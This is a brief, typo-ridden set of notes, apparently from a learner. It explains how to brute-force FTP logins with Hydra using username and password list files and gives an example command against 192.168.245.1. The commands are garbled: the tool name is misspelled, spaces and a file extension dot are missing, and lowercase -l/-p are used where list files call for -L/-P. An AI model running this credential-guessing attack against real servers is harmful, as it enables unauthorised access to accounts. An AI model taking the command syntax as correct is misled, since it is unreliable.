using hydra as an exploitation
to exploit ftp
firt you have to creat a file containing list of  username and passwords
then you use the command key
hydr -l /home/kali/downloads/username.txt -p /home/kali/downloads/password.txt (ip adress of the target) FTP -V

FOR EXAMPLE

hydra-l /home/kali/downloads/username.txt -p /home/kali/downloads/passwordtxt 192.168.245.1 ftp -v

